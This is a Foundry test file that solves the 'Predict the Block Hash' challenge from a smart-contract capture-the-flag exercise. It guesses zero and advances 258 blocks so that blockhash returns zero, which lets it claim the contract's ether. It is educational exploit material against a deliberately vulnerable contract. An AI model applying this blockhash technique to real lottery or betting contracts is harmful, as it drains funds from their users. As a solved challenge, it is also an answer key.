// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import {PredictTheBlockHashChallenge} from "../../src/lotteries/PredictTheBlockHashChallenge.sol";

contract TestPredictTheBlockHashChallenge is Test {
    PredictTheBlockHashChallenge challenge;

    address deployer = makeAddr("deployer");
    address player = makeAddr("player");

    function setUp() external {
        vm.deal(deployer, 1 ether);
        vm.deal(player, 1 ether);

        vm.prank(deployer);
        challenge = new PredictTheBlockHashChallenge{value: 1 ether}();
    }

    function test_Solution() external {
        vm.startPrank(player);

        // answer is the blockhash of the settlementBlockNumber
        // you can only access the the hashes of the most recent 256 blocks
        // -> after 256 + 1 + 1 blocks answer will be zero
        bytes32 guess = bytes32(uint256(0));
        challenge.lockInGuess{value: 1 ether}(guess);
        vm.roll(block.number + 258);

        challenge.settle();

        vm.stopPrank();

        assert(player.balance == 2 ether);
        assert(challenge.isComplete());
    }
}
